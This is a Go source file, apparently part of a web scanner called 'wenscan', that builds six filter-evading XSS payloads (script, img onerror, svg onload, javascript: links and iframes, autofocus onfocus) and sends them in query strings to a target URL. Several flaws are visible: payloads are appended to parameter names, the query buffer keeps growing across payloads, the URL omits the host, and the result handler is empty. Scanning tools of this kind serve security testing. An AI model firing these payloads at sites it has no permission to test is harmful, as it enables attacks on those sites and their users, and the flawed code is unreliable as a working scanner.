package Xss

import (
	"bytes"
	"fmt"
	"math/rand"
	"net/url"
	"time"
	log "wenscan/Log"

	"github.com/go-resty/resty/v2"
)

type Xss struct {
	RawString string
	Url       *url.URL
	Query     *url.Values
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

var (
	script_payload  string = "<ScRiPt>%s</sCrIpT>"
	img_payload     string = "<iMg SrC=1 oNeRrOr=%s>"
	href_payload    string = "<a HrEf=JaVaScRiPt:%s>cLiCk</A>"
	svg_payload     string = "<sVg/OnLoAd=%s>"
	iframe_payload  string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
	input_payload   string = "<input autofocus onfocus=%s>"
	payload3_prompt string = "prompt(1)"
)

func (xss *Xss) ParseUrl() error {
	u, err := url.Parse(xss.RawString)
	if err != nil {
		log.Fatal("ParseUrl err:", err.Error())
	}
	m, err := url.ParseQuery(u.RawQuery)
	if err != nil {
		log.Fatal("ParseUrl err:", err.Error())
	}
	xss.Url = u
	xss.Query = &m
	return err
}

//Handledata 处理xss数据
func (xss *Xss) Handledata() {

	var querystring bytes.Buffer
	var payloads = []string{
		script_payload,
		img_payload,
		href_payload,
		svg_payload,
		iframe_payload,
		input_payload,
	}
	log.DebugEnable(true)
	//生成随机字符串
	sc := RandStringRunes(12)

	//组装xss payload
	for _, pl := range payloads {
		payload := fmt.Sprintf(pl, sc)
		log.Debug(sc)
		client := resty.New()

		for k, _ := range *xss.Query {
			querystring.WriteString(k + payload + "&")
		}
		log.Debug("cs:", string(querystring.Bytes()[:querystring.Len()-1]))
		resp, err := client.R().
			EnableTrace().
			SetQueryString(string(querystring.Bytes()[:querystring.Len()-1])).
			Get(xss.Url.Scheme + xss.Url.User.String() + xss.Url.RawPath)
		if err != nil {
			log.Fatal("Get fatal error:", err.Error())
		}
		if resp.IsError() {
			log.Error("  Status Code:", resp.StatusCode())
			log.Error("  Status     :", resp.Status())
			log.Error("  Proto      :", resp.Proto())
			log.Error("  Time       :", resp.Time())
			log.Error("  Received At:", resp.ReceivedAt())
			log.Error("  Body       :\n", resp)
		} else {
			log.Debug(" request sucess")
			log.Debug(" responds:\n", resp)
		}

	}

}

func (xss *Xss) AddXSSVuln(resp *resty.Response) {

}
